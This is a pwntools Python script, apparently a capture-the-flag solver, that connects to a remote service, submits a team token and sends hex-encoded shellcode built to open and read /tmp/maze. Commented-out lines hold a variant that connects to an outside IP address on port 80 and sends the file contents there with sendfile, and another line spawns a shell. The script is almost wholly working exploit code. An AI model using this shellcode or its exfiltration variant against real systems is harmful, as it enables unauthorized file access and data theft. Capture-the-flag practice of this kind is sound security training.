#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

team_token = '0676467f246f3fc0e2219c6c99dcdb0e'
remote_service = "172.20.5.31 9999"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)
# e = ELF(filename, checksec=False)
# l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass
ru(b'Input your teamtoken: ')
sl(b'0676467f246f3fc0e2219c6c99dcdb0e')

ru(b'Input your hex-encoded shellcode: ')


# shellcode = '''

# sub rsp, 0x1000
# // open("/tmp/maze", 0, 0);
# push 0x65
# push 0x7a616d2f706d742f
# mov rdi, rsp
# xor rsi, rsi
# xor rdx, rdx
# push 2
# pop rax
# syscall
# // read(rax, rsp, 0x10000);
# mov rdi, rax
# mov rsi, rsp
# mov rdx, 0x10000
# xor rax, rax
# syscall




# '''
with open("./sol.txt", "r") as fd:
	data = fd.read()

# sc = shellcraft.write(data.en)
# sc = shellcraft.open("/tmp/maze", 0, 0)
# sc += shellcraft.read('rax', 'rsp', 0x7fffffff)
sc = shellcraft.open("/tmp/maze", 0, 0)
sc += '\npush rax;'
sc += shellcraft.mmap(0, 0x1000, 7, 34, 0)
sc += '\npop r11;'	
sc += shellcraft.read('r11', 'rax', 0x1000)

sc += shellcraft.exit('rax')

# sc += '\nmov r11, rax;'
# sc += shellcraft.connect("124.223.100.24", 80)
# sc += '\nmov r14, rax'
# sc += shellcraft.sendfile('r14', 'r11', 0, 0x7fffffff)
# sc += shellcraft.exit(0)
# payload = asm(sc)



shellcode = asm(sc)
# shellcode = shellcraft.sh()
# shellcode = asm(shellcode)

shellcode= shellcode.hex().encode()
print(shellcode)
sl(shellcode)


debugPID()
irt()
